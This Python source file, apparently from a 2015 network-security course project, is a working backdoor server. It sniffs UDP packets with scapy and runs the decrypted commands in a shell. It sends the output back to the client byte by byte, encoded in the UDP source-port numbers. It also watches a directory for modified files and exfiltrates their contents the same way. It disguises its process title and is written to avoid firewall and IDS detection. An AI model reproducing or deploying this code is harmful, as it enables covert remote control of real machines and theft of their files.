##################################################################################
##  SOURCE FILE:    Server.py
##
##  AUTHOR:         Geoff Dabu
##					Ben Kim
##
##  PROGRAM:        Backdoor program which receives commands, executes them and
##                  returns the output to the client. Also it returns contents of 
##					modified file that a client specified. The communication between
##					client and itself should not be noticible in its firewall or IDS.
##					Another words, the application is using a covert channel.
##					The process title is also changed to disguise itself.
##
##  FUNCTIONS:      executeShellCommand(string)
##					parsePacket(packet)
##                  main()
##
##  DATE:           November 17, 2015
##
##################################################################################
import sys, os, argparse, socket, subprocess, logging, time, subprocess, setproctitle, threading, pyinotify, string
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from AesEncryption import *


wm = pyinotify.WatchManager()
mask = pyinotify.IN_CLOSE_WRITE | pyinotify.IN_CREATE

class EventHandler(pyinotify.ProcessEvent):

    def __init__(self, receivedPacket):
        self.pkt = receivedPacket

    def process_IN_CREATE(self, event):
        print "new creation"

    def process_IN_CLOSE_WRITE(self, event):
        filepath = event.pathname
        filename = event.name
        # filename = get_filename(filepath)
        print "file", filename, "modified"

        # port knock to client

        # open a file and sent it to client
        secretFile = open(filepath, 'rb')
        data_byte_array = bytearray(encrypt(secretFile.read()))
        print data_byte_array



        for b in data_byte_array:
            print b
            send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=int(b)))
            time.sleep(0.5)

        send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=128)/encrypt(filename))
        # with open(filepath, 'rb') as f:
        #     data = bytearray(f.read())
        #     print data
        # if data != None:
        #     send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000, sport=7070)/(" " + data))
    #
    # def send_file(self, message):
    #     print self.pkt["IP"].dst
    #     send(IP(src=self.pkt["IP"].dst, dst=self.pkt["IP"].src)/UDP(dport=7000)/message)

def watch_file(directory, receivedPacket):

    handler = EventHandler(receivedPacket)
    notifier = pyinotify.Notifier(wm, handler)
    wdd = wm.add_watch(directory, mask, rec=True)
    notifier.loop()


##################################################################################
##  FUNCTION
##
##  Name:           executeShellCommand
##  Parameters:     string - a shell command
##  Return Values:  string - the output of the shell command
##  Description:    executes a shell command and returns the output
##################################################################################
def executeShellCommand(command):

    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    outputString = "\nOUTPUT:\n" + output.stdout.read() + output.stderr.read()
    return outputString


##################################################################################
##  FUNCTION
##
##  Name:           parsePacket
##  Parameters:     packet - a packet which is passed in through sniff()
##  Return Values:  n/a
##  Description:    receives a packet, decrypts the payload for a command,
##                  runs the command, and sends back a packet with a decrypted
##                  output result.
##################################################################################
def parsePacket(receivedPacket):

    if receivedPacket['UDP'].dport == 22:

        command = (receivedPacket['Raw'].load)

        directory = (receivedPacket['Raw'].load)
        print "Watching: ", directory
        t = threading.Thread(name="watchfile_threading", target=watch_file, args=[directory, receivedPacket])
        t.start()


    elif receivedPacket["UDP"].dport == 80:

        command = decrypt(receivedPacket['Raw'].load)

        print "Excuting: " + command
        output = executeShellCommand(command)
        print "Output: " + output
        output = encrypt(output)
        print output

        output_dec = [ord(ch) for ch in output]
        print len(output_dec)
        print output_dec

        for srcport in output_dec:
            returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=srcport)/encrypt(output)
            send(returnPacket)
            # time.sleep(0.5)

        returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=128)/encrypt(output)
        send(returnPacket)

##################################################################################
##  FUNCTION
##
##  Name:           main
##  Parameters:     n/a
##  Return Values:  n/a
##  Description:    Changes the process name of this program, and listens for
##                  packets that are directed to specific ports.
##################################################################################
def main():

    setproctitle.setproctitle("notabackdoor.py")
    sniff(filter="udp and (dst port 80 or dst port 22) and (src port 8000)", prn=parsePacket)

if __name__ == '__main__':
    main()
